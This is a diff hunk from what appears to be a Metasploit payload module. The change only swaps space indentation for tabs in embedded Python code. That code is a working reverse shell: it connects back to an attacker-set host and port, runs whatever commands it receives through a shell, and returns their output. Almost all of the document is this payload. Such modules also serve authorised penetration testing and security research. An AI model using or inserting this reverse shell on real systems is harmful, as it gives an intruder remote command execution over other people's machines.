@@ -48,12 +48,12 @@ module MetasploitModule
       so=s.socket(s.AF_INET,s.SOCK_STREAM)
       so.connect(('#{datastore['LHOST']}',#{datastore['LPORT']}))
       while True:
-        d=so.recv(1024)
-        if len(d)==0:
-            break
-        p=r.Popen(d.decode('utf-8'),shell=True,stdin=r.PIPE,stdout=r.PIPE,stderr=r.PIPE)
-        o=p.stdout.read()+p.stderr.read()
-        so.send(o)
+      	d=so.recv(1024)
+      	if len(d)==0:
+      		break
+      	p=r.Popen(d.decode('utf-8'),shell=True,stdin=r.PIPE,stdout=r.PIPE,stderr=r.PIPE)
+      	o=p.stdout.read()+p.stderr.read()
+      	so.send(o)
     PYTHON
 
     py_create_exec_stub(cmd)
